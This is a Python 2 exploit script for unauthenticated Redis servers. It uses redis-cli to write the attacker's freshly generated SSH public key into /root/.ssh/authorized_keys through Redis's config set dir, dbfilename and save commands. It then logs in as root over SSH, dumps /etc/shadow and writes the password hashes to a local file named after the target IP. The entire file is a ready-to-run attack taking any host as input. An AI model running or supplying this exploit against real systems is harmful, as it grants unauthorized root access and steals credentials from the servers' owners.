#!/usr/bin/env python
#coding:utf8
"""
exploit Redis unauthorized access to get file /etc/shadow
python redis.py -h ip [-p port] -s [ssh_port]
"""
import os
import sys
import getopt
import time


def main(ip, port, ssh):
	print ip,':',port,' and ssh port',ssh
	rsa_pub = './tttid_rsa.pub'
	rsa = './tttid_rsa'
	rsa_pub_f = './tttfoo.txt'

	if not os.path.exists(rsa):
		cmd = 'ssh-keygen -t rsa -P \'\' -f '+rsa
		foutput = os.popen(cmd)
		time.sleep(10)
		cmd = '(echo -e "\n\n";cat '+rsa_pub+';echo -e "\n\n")>'+rsa_pub_f
		foutput = os.popen(cmd)

		cmd = 'ssh-add '+rsa
		foutput = os.popen(cmd)

	if not os.path.exists(rsa) or not os.path.exists(rsa_pub_f):
		print 'keygen error'
		sys.exit()

	cmd = 'echo 111 | redis-cli -h '+ip+' -p '+str(port)
	foutput = os.popen(cmd)
	# if foutput.read().find('OK') == -1 :
	# 	print foutput.read()
	# 	sys.exit()
	# print cmd,' OK!'

	cmd = 'cat '+rsa_pub_f+' | redis-cli -h '+ip+' -p '+str(port)+' -x set crackit'
	foutput = os.popen(cmd)

	cmd = 'echo config set dir /root/.ssh/ | redis-cli -h '+ip+' -p '+str(port)
	foutput = os.popen(cmd)

	cmd = 'echo config set dbfilename "authorized_keys" | redis-cli -h '+ip+' -p '+str(port)
	foutput = os.popen(cmd)

	cmd = 'echo save | redis-cli -h '+ip+' -p '+str(port)
	foutput = os.popen(cmd)

	# cmd = 'echo yes | ssh -i '+rsa+' root@'+ip+' -p '+str(ssh)
	# #scp -i id_rsa root@ip:/etc/shadow .
	
	# foutput = os.popen(cmd)

	cmd = 'echo cat /etc/shadow | ssh -i '+rsa+' root@'+ip+' -p '+str(ssh)
	#scp -i id_rsa root@ip:/etc/shadow .
	foutput = os.popen(cmd)

	print 'save shadow to file ./',ip
	output = open(ip, 'w')
	output.write(foutput.read())
	output.close()




if __name__ == '__main__':
	ip = ''
	port = 6379
	ssh = 22
	options,args = getopt.getopt(sys.argv[1:],"h:p:s:")

	for opt,arg in options:
		if opt == '-h':
			ip = arg
		elif opt == '-p':
			port = arg
		elif opt == '-s':
			ssh = arg

	if ip == '' :
		#print '\033[1;31;40m'
		print 'python redis.py -h ip [-p port] -s [ssh_port]'
		#print '\033[0m'
		sys.exit()


main(ip, port, ssh)
